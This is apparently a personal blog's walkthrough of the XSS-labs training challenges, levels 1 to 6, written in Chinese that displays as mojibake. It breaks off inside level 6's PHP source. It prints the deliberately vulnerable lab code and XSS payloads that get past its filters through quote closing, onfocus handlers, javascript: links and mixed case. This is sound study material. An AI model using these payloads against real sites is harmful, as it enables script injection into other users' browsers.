<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ycycyc - XSS-labs(åŒ…æ‹¬å¤šç§ç»•è¿‡å§¿åŠ¿)</title>
    <link rel="stylesheet" href="/css/styles.css">
    <link rel="stylesheet" href="/css/tailwind.css">
    <link rel="stylesheet" href="/css/highlight.css">
    <link rel="stylesheet" href="/css/toc.css">
    
<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
    <div class="container mx-auto flex items-center justify-between space-x-8">
    
      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
        <a href="/" class="hover:text-white transition-colors select-none">
          ycycyc
        </a>
      </h1>
  
    <!-- å¤§å±å¹• -->
      <nav class="hidden md:block">
        <ul class="flex space-x-6">
          
            <li>
              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Home
              </a>
            </li>
          
            <li>
              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Archives
              </a>
            </li>
          
            <li>
              <a href="/categories" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Categories
              </a>
            </li>
          
            <li>
              <a href="/tags" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Tags
              </a>
            </li>
          
            <li>
              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                About
              </a>
            </li>
          
        </ul>
      </nav>
  
      <!-- å°å±å¹• -->
      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
        </svg>
      </button>
    </div>
  
    <!-- æŠ˜å èœå• -->
    <nav id="mobile-menu" class="hidden bg-black">
      <ul class="space-y-2 py-4 px-6">
        
          <li>
            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
              Home
            </a>
          </li>
        
          <li>
            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
              Archives
            </a>
          </li>
        
          <li>
            <a href="/categories" class="block text-white hover:text-hacker-color1 transition-colors">
              Categories
            </a>
          </li>
        
          <li>
            <a href="/tags" class="block text-white hover:text-hacker-color1 transition-colors">
              Tags
            </a>
          </li>
        
          <li>
            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
              About
            </a>
          </li>
        
      </ul>
    </nav>
   <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-F9W89HDHWL"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-F9W89HDHWL');
</script>
  
    <!-- RSS Link -->
    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
  </header>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="/js/search.js"></script>
  <script>
        document.addEventListener("DOMContentLoaded", () => {
    const menuToggle = document.getElementById("menu-toggle");
    const mobileMenu = document.getElementById("mobile-menu");

    menuToggle.addEventListener("click", () => {
        if (mobileMenu.classList.contains("hidden")) {
        mobileMenu.classList.remove("hidden");
        } else {
        mobileMenu.classList.add("hidden");
        }
    });
    });

  </script>
  

    <style>
        p {
            margin-top: 0 !important;
            margin-bottom: 1rem !important;
            font-size: 1.1rem;
        }
        figure {
            margin: 0 !important;
        }
        pre {
            padding: 0 !important;
            margin-top: 0 !important;
            margin-bottom: 1rem !important;
        }
        td {
            padding: 0 !important;
            margin-bottom: 1rem !important;
        }
        h1, h2, h3, h4, h5, h6 {
            margin-top: 0 !important;
            margin-bottom: 1rem !important;
        }
        @media (min-width: 1024px) {
            #middle-box {
                min-width: 56rem;
            }
        }
    </style>
<meta name="generator" content="Hexo 7.3.0"></head>
<body class="bg-black text-hacker-color3 container mx-auto" style="overflow-x:hidden">
    <!-- æ–‡ç« æ ‡é¢˜ -->
    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">XSS-labs(åŒ…æ‹¬å¤šç§ç»•è¿‡å§¿åŠ¿)</h1>

    <!-- å‘å¸ƒæ—¶é—´ -->
    <p class="text-hacker-color3 text-center text-sm mb-4">
        2025-05-28
    </p>

    <!-- æ–‡ç« å†…å®¹ -->
    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight" style="display: flex;">
        <div id="middle-box">
            <h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>æŸ¥çœ‹ç½‘ç«™æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">window.alert = function()</span><br><span class="line">&#123;</span><br><span class="line">confirm(&quot;å®Œæˆçš„ä¸é”™ï¼&quot;);</span><br><span class="line"> window.location.href=&quot;level2.php?keyword=test&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level1&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·test&lt;/h2&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>

<p>å°†testçš„å€¼æ’å…¥åˆ°äº†htmlæ ‡ç­¾ä¸­</p>
<p>ç›´æ¥GETä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505182353309.png" alt="image-20250518235305246"></p>
<p>æºä»£ç ä¹Ÿä¸å­˜åœ¨ä»»ä½•è¿‡æ»¤</p>
<h1 id="level2ï¼ˆé—­åˆï¼‰"><a href="#level2ï¼ˆé—­åˆï¼‰" class="headerlink" title="level2ï¼ˆé—­åˆï¼‰"></a>level2ï¼ˆé—­åˆï¼‰</h1><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505182355469.png" alt="image-20250518235554410"></p>
<p>ç›´æ¥è¾“å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å¼¹çª—ï¼ŒæŸ¥çœ‹ç½‘é¡µçš„æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level2&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°è¾“å…¥çš„testä½œä¸ºvalueå€¼è¢«æœåŠ¡ç«¯è½¬ä¹‰äº†</p>
<p>æ—¢ç„¶æ˜¯valueå€¼è¢«è½¬ç§»äº†ï¼Œé‚£ä¹ˆæå‰é—­åˆç‚¹valueå€¼ä¸å°±èƒ½å¤Ÿé¿å…è½¬ä¹‰äº†å—</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505190003902.png" alt="image-20250519000339865"></p>
<h1 id="level3ï¼ˆonfocusäº‹ä»¶ï¼‰"><a href="#level3ï¼ˆonfocusäº‹ä»¶ï¼‰" class="headerlink" title="level3ï¼ˆonfocusäº‹ä»¶ï¼‰"></a>level3ï¼ˆonfocusäº‹ä»¶ï¼‰</h1><p>è¾“å…¥<script>alert()</script></p>
<p>é¡µé¢æ²¡æœ‰å¼¹çª—ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level3&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæ˜¯å•å¼•å·é—­åˆ</p>
<p>è¾“å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&#x27;&amp;gt;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&amp;lt;&#x27;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&#x27;&amp;gt;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&amp;lt;&#x27;&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°valueå€¼ä¸­çš„&lt;&gt;å¤§äºå°äºç¬¦å·ä¹Ÿè¿›è¡Œäº†HTMLå®ä½“åŒ–ç¼–ç </p>
<p>æŸ¥çœ‹ä¸€ä¸‹ç¬¬ä¸‰å…³çš„æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°äº†htmlspecialchars()å‡½æ•°</p>
<p>é¦–å…ˆå¯¹å¤§å°äºç¬¦å·è¿›è¡Œäº†ç¼–ç </p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505190018204.png" alt="image-20250519001808166"></p>
<p>æ²¡æœ‰å¯¹å•å¼•å·è¿›è¡Œç¼–ç </p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505190018475.png" alt="image-20250519001851444"></p>
<p>å¯¹åŒå¼•å·è¿›è¡Œäº†ç¼–ç </p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨<strong>onfocusäº‹ä»¶</strong>ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">onfocusäº‹ä»¶</span><br><span class="line"></span><br><span class="line">åœ¨å¯¹è±¡è·å¾—ç„¦ç‚¹çš„æ—¶å€™å‘ç”Ÿï¼Œæ‰§è¡Œjavascriptï¼šè·å¾—ç„¦ç‚¹æŒ‡çš„æ˜¯é€šè¿‡tabå¯¼èˆªæˆ–è€…æ˜¯ç‚¹å‡»åˆ°ä¸€ä¸ªå¯èšç„¦çš„å…ƒç´ ï¼Œå¸¸è§çš„å¯ä»¥è·å¾—ç„¦ç‚¹çš„å…ƒç´ </span><br><span class="line">&lt;input&gt;</span><br><span class="line"></span><br><span class="line">&lt;textarea&gt;</span><br><span class="line"></span><br><span class="line">&lt;select&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; (å¸¦æœ‰ href å±æ€§)</span><br><span class="line"></span><br><span class="line">&lt;button&gt;</span><br><span class="line"></span><br><span class="line">ä»»ä½•è®¾ç½®äº† tabindex å±æ€§çš„å…ƒç´ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚è¿™é‡Œ</p>
<p><img src="C:\Users\cj\AppData\Roaming\Typora\typora-user-images\image-20250519003256414.png" alt="image-20250519003256414"></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onfocus=javascript:alert() &#x27;</span><br></pre></td></tr></table></figure>

<p>å•å¼•å·é—­åˆå‰åçš„å•å¼•å·ï¼Œé…åˆjavascriptä¼ªåè®®æ‰§è¡Œjavascriptä»£ç <img src="C:\Users\cj\AppData\Roaming\Typora\typora-user-images\image-20250519003427257.png" alt="image-20250519003427257"></p>
<p><strong>è§¦å‘æ¡ä»¶æ˜¯å†æ¬¡ç‚¹å‡»è¾“å…¥æ¡†ï¼Œå³é€šè¿‡ç‚¹å‡»inputè¾“å…¥æ¡†æ˜¯å¯¹è±¡è·å¾—ç„¦ç‚¹ä»è€Œæ‰§è¡Œjavascript:</strong></p>
<h1 id="level4ï¼ˆonfocusäº‹ä»¶åŠ é—­åˆå¼•å·ï¼‰"><a href="#level4ï¼ˆonfocusäº‹ä»¶åŠ é—­åˆå¼•å·ï¼‰" class="headerlink" title="level4ï¼ˆonfocusäº‹ä»¶åŠ é—­åˆå¼•å·ï¼‰"></a>level4ï¼ˆonfocusäº‹ä»¶åŠ é—­åˆå¼•å·ï¼‰</h1><p>ä¾æ—§æ˜¯å¤§å°äºç¬¦å·è¢«è¿‡æ»¤æ‰äº†</p>
<p>æŸ¥çœ‹æºç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ç§»é™¤äº†&gt;&lt;ç¬¦å·ï¼Œå¹¶å¯¹inputè¾“å…¥çš„å†…å®¹è¿›è¡Œäº†HTMLå®ä½“ç¼–ç </p>
<p>åŒæ ·ä½¿ç”¨level3çš„<strong>onfocusäº‹ä»¶</strong>ç»•è¿‡</p>
<p>æœ‰ç½‘é¡µçš„æºç å°±å¯ä»¥å¾—çŸ¥</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191600693.png" alt="image-20250519160001562"></p>
<p>è¿™é‡Œæ˜¯åŒå¼•å·é—­åˆ</p>
<p>æ‰€ä»¥æ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=javascript:alert() &quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191601096.png" alt="image-20250519160144032"></p>
<p>è¾“å…¥ä¸Šé¢çš„å†…å®¹ä¹‹åå†æ¬¡ç‚¹å‡»è¾“å…¥æ¡†ï¼ŒåŸç†ä¸ä¸Šé¢level3ç›¸åŒ</p>
<h1 id="level5ï¼ˆ-a-æ ‡ç­¾çš„hrefå±æ€§åŠ é—­åˆï¼‰"><a href="#level5ï¼ˆ-a-æ ‡ç­¾çš„hrefå±æ€§åŠ é—­åˆï¼‰" class="headerlink" title="level5ï¼ˆ &lt; a &gt; æ ‡ç­¾çš„hrefå±æ€§åŠ é—­åˆï¼‰"></a>level5ï¼ˆ &lt; a &gt; æ ‡ç­¾çš„hrefå±æ€§åŠ é—­åˆï¼‰</h1><p>è¾“å…¥&lt;&gt;</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191605369.png" alt="image-20250519160501308"></p>
<p>å‘ç°åŒæ ·å­˜åœ¨HTMLå®ä½“åŒ–ç¼–ç </p>
<p>è¾“å…¥çš„<script>è¢«æ›¿æ¢ä¸ºäº†<scr_ipt></p>
<p>è¿™é‡ŒåŒæ ·æ˜¯åŒå¼•å·é—­åˆï¼Œå°è¯•åŒå¼•å·é—­åˆçš„onfocusç»•è¿‡</p>
<p>æ„é€ paoload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=javascript:alert() &quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191608262.png" alt="image-20250519160832193"></p>
<p>ä¸ºä»€ä¹ˆæ²¡æœ‰æˆåŠŸçš„å¼¹çª—å¯æƒ³è€ŒçŸ¥</p>
<p>onfocusè¢«æ›¿æ¢ä¸ºäº†o_nfocus</p>
<p>è§‚å¯Ÿæºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå‡½æ•°strtolower()å°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å…¨éƒ¨è½¬åŒ–ä¸ºå°å†™</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191613156.png" alt="image-20250519161319065"></p>
<p>ä¹Ÿå¯¹ä¸Šé¢è¿™ä¸¤ä¸ªå…³é”®å­—ç¬¦è¿›è¡Œäº†æ›¿æ¢</p>
<p>ç”±äºstrtolower()å‡½æ•°çš„å­˜åœ¨ï¼Œæˆ‘ä»¬å°±ä¸èƒ½å¤Ÿä½¿ç”¨å¤§å°å†™ç»•è¿‡æ¥ä½¿ç”¨jsæ ‡ç­¾å¼¹çª—äº†</p>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨</p>
<p><strong><a>æ ‡ç­¾çš„hrefå±æ€§</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hrefå±æ€§çš„æ„æ€æ˜¯ å½“æ ‡ç­¾&lt;a&gt;è¢«ç‚¹å‡»çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘æ‰§è¡Œè½¬è·³ï¼Œä¸Šé¢æ˜¯è½¬è·³åˆ°ä¸€ä¸ªç½‘ç«™ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è§¦å‘æ‰§è¡Œä¸€æ®µjsä»£ç </span><br></pre></td></tr></table></figure>

<p>æ·»åŠ ä¸€ä¸ªæ–°çš„æ ‡ç­¾å¿…é¡»è¦é—­åˆå‰é¢çš„æ ‡ç­¾ï¼Œpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=javascript:alert()&gt;sss&lt;/a&gt; &lt;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191620392.png" alt="image-20250519162001312"></p>
<p><strong>æ³¨æ„</strong></p>
<p><a>æ ‡ç­¾æ˜¯HTMLçš„è¶…é“¾æ¥é”šç‚¹ï¼Œhrefç”¨äºæŒ‡å®šé“¾æ¥ç›®æ ‡ï¼ˆåŒæ ·å¯ä»¥ä½¿ç”¨javascriptï¼šä¼ªåè®®æ‰§è¡Œjavascriptä»£ç ï¼‰è¿™é‡Œçš„ssså°±æ˜¯é“¾æ¥ç°å®çš„æ–‡æœ¬</p>
<h1 id="level6ï¼ˆå¤§å°å†™ï¼‰"><a href="#level6ï¼ˆå¤§å°å†™ï¼‰" class="headerlink" title="level6ï¼ˆå¤§å°å†™ï¼‰"></a>level6ï¼ˆå¤§å°å†™ï¼‰</h1><p>è¿™ä¸€å…³æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„è¾“å…¥ä¸€äº›ç®€å•çš„è¯­å¥è¿›è¡Œæµ‹è¯•ï¼Œä¸ä¸Šé¢çš„level5ç›¸åŒ</p>
<p>å°†onæ›¿æ¢ä¸ºäº†o_nï¼Œå°†scriptæ›¿æ¢ä¸ºscr_ipt</p>
<p>æµ‹è¯•å‘ç°ä¸å­˜åœ¨å¤§å°å†™è¿‡æ»¤</p>
<p>ç›´æ¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡</p>
<p>æ„é€ payload(åŒå¼•å·é—­åˆ)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;SCRipt&gt;alert()&lt;/SCRipt&gt;&lt;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505191633791.png" alt="image-20250519163309701"></p>
<p>æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸€å…³çš„è¿‡æ»¤ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span 